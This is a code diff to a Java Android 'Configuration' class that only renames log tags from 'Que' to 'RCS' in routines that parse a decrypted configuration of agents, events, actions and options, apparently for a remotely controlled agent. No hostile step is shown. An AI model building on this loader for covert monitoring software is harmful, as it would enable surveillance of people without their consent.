@@ -73,7 +73,7 @@ public class Configuration {
         }
 
         confHash = (int) tempHash;
-        Log.d("Que", "Configuration CRC: " + confHash);
+        Log.d("RCS", "Configuration CRC: " + confHash);
         return confHash;
     }
 	
@@ -90,7 +90,7 @@ public class Configuration {
 			throw new RCSException("Tag " + tag + " not found");
 		}
 		
-		Log.d("Que", "Tag " + tag + " found at: " + index);
+		Log.d("RCS", "Tag " + tag + " found at: " + index);
 		return index;
 	}
 	
@@ -112,7 +112,7 @@ public class Configuration {
 		int agentNum = wrappedClearConf.getInt(agentTag);
 		wrappedClearConf.position(agentTag + 4);
 
-		Log.d("Que", "Number of agents: " + agentNum);
+		Log.d("RCS", "Number of agents: " + agentNum);
 		
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < agentNum; i++) {
@@ -125,7 +125,7 @@ public class Configuration {
 			if (plen != 0)
 				wrappedClearConf.get(params, 0, plen);
 			
-			Log.d("Que", "Agent: " + id + " Status: " + status + " Params Len: " + plen);
+			Log.d("RCS", "Agent: " + id + " Status: " + status + " Params Len: " + plen);
 			
 			Agent a = new Agent(id, status, params);
 			statusObj.addAgent(a);
@@ -152,7 +152,7 @@ public class Configuration {
 		int eventNum = wrappedClearConf.getInt(eventTag);
 		wrappedClearConf.position(eventTag + 4);
 
-		Log.d("Que", "Number of events: " + eventNum);
+		Log.d("RCS", "Number of events: " + eventNum);
 		
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < eventNum; i++) {
@@ -165,7 +165,7 @@ public class Configuration {
 			if (plen != 0)
 				wrappedClearConf.get(params, 0, plen);
 			
-			Log.d("Que", "Event: " + type + " Action: " + action + " Params Len: " + plen);
+			Log.d("RCS", "Event: " + type + " Action: " + action + " Params Len: " + plen);
 			
 			Event e = new Event(type, i, action, params);
 			statusObj.addEvent(e);
@@ -181,7 +181,7 @@ public class Configuration {
 	private void loadActions() throws RCSException {
 		int actionNum = wrappedClearConf.getInt();
 		
-		Log.d("Que", "Number of actions " + actionNum);
+		Log.d("RCS", "Number of actions " + actionNum);
 		
 		try {
 			for (int i = 0; i < actionNum; i++) {
@@ -189,7 +189,7 @@ public class Configuration {
 				
 				Action a = new Action(i, subNum);
 				
-				Log.d("Que", "Action " + i + " SubActions: " + subNum);
+				Log.d("RCS", "Action " + i + " SubActions: " + subNum);
 				
 				for (int j = 0; j < subNum; j++) {
 					int type = wrappedClearConf.getInt();
@@ -202,7 +202,7 @@ public class Configuration {
 					
 					a.addSubAction(type, params);
 					
-					Log.d("Que", "SubAction " + j + " Type: " + type + " Params Length: " + plen);
+					Log.d("RCS", "SubAction " + j + " Type: " + type + " Params Length: " + plen);
 				}
 				
 				statusObj.addAction(a);
@@ -229,7 +229,7 @@ public class Configuration {
 		int optionsNum = wrappedClearConf.getInt(optionsTag);
 		wrappedClearConf.position(optionsTag + 4);
 
-		Log.d("Que", "Number of options: " + optionsNum);
+		Log.d("RCS", "Number of options: " + optionsNum);
 
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < optionsNum; i++) {
@@ -241,7 +241,7 @@ public class Configuration {
 			if (plen != 0)
 				wrappedClearConf.get(params, 0, plen);
 
-			Log.d("Que", "Option: " + id + " Params Len: " + plen);
+			Log.d("RCS", "Option: " + id + " Params Len: " + plen);
 
 			Option o = new Option(id, params);
 			statusObj.addOption(o);
@@ -293,17 +293,17 @@ public class Configuration {
 			}
 			
 			// Return decrypted conf
-			Log.d("Que", "Configuration is valid");
+			Log.d("RCS", "Configuration is valid");
 			return;
 		} catch (IOException ioe) {
 			ioe.printStackTrace();
-			Log.d("Que", "IOException() detected");
+			Log.d("RCS", "IOException() detected");
 		} catch (SecurityException se) {
 			se.printStackTrace();
-			Log.d("Que", "SecurityException() detected");
+			Log.d("RCS", "SecurityException() detected");
 		} catch (Exception e) {
 			e.printStackTrace();
-			Log.d("Que", "Exception() detected");			
+			Log.d("RCS", "Exception() detected");			
 		}
 		
 		return;
